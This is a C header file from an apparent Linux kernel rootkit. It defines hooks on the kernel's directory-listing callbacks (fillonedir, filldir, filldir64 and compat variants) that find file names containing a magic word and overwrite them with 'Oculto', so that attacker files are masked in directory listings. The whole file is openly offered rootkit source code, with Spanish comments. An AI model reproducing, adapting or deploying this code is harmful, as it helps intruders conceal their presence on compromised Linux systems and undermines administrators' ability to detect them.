#pragma once


#include "rootkit.h"

//include <fs/readdir.c>
struct readdir_callback {
	struct dir_context ctx;
	struct old_linux_dirent __user * dirent;
	int result;
};

extern char* MAGIC_WORD;

static bool (*orig_fillonedir)(struct dir_context *ctx,
		const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type);

static bool hook_fillonedir(struct dir_context *ctx,
		const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
	
	struct readdir_callback *buf =
	container_of(ctx, struct readdir_callback, ctx);

	if (strstr(name, MAGIC_WORD)) {
		// Renombra la entrada a "Oculto"
		strncpy((char*)name, "Oculto", namlen);
		return orig_fillonedir(ctx, name, strlen("Oculto"), offset, ino, d_type);
	}
	
	return orig_fillonedir(ctx, name, namlen, offset, ino, d_type);
}

static bool (*orig_filldir)(struct dir_context *ctx, const char *name, int namlen,
		   loff_t offset, u64 ino, unsigned int d_type);

static bool hook_filldir(struct dir_context *ctx, const char *name, int namlen,
		   loff_t offset, u64 ino, unsigned int d_type) {
	
	struct readdir_callback *buf =
	container_of(ctx, struct readdir_callback, ctx);

	if (strstr(name, MAGIC_WORD)) {
		// Renombra la entrada a "Oculto"
		strncpy((char*)name, "Oculto", namlen);
		return orig_filldir(ctx, name, strlen("Oculto"), offset, ino, d_type);
	}
	
	return orig_filldir(ctx, name, namlen, offset, ino, d_type);
}

static bool (*orig_filldir64)(struct dir_context *ctx, const char *name, int namlen,
			 loff_t offset, u64 ino, unsigned int d_type);

static bool hook_filldir64(struct dir_context *ctx, const char *name, int namlen,
			 loff_t offset, u64 ino, unsigned int d_type) {
	
	struct readdir_callback *buf =
	container_of(ctx, struct readdir_callback, ctx);

	if (strstr(name, MAGIC_WORD)) {
		// Renombra la entrada a "Oculto"
		strncpy((char*)name, "Oculto", namlen);
		return orig_filldir64(ctx, name, strlen("Oculto"), offset, ino, d_type);
	}
  
	return orig_filldir64(ctx, name, namlen, offset, ino, d_type);
}

static bool (*orig_compat_fillonedir)(struct dir_context *ctx, const char *name,
				 int namlen, loff_t offset, u64 ino,
				 unsigned int d_type);

static bool hook_compat_fillonedir(struct dir_context *ctx, const char *name,
				 int namlen, loff_t offset, u64 ino,
				 unsigned int d_type) {
	
	struct readdir_callback *buf =
	container_of(ctx, struct readdir_callback, ctx);

	if (strstr(name, MAGIC_WORD)) {
		// Renombra la entrada a "Oculto"
		strncpy((char*)name, "Oculto", namlen);
		return orig_compat_fillonedir(ctx, name, strlen("Oculto"), offset, ino, d_type);
	}
	
	return orig_compat_fillonedir(ctx, name, namlen, offset, ino, d_type);
}

static bool (*orig_compat_filldir)(struct dir_context *ctx, const char *name, int namlen,
		loff_t offset, u64 ino, unsigned int d_type);

static bool hook_compat_filldir(struct dir_context *ctx, const char *name, int namlen,
		loff_t offset, u64 ino, unsigned int d_type) {
	
	struct readdir_callback *buf =
	container_of(ctx, struct readdir_callback, ctx);

	if (strstr(name, MAGIC_WORD)) {
		// Renombra la entrada a "Oculto"
		strncpy((char*)name, "Oculto", namlen);
		return orig_compat_filldir(ctx, name, strlen("Oculto"), offset, ino, d_type);
	}
	
	return orig_compat_filldir(ctx, name, namlen, offset, ino, d_type);
}

// there is no compat_filldir64 in 6.5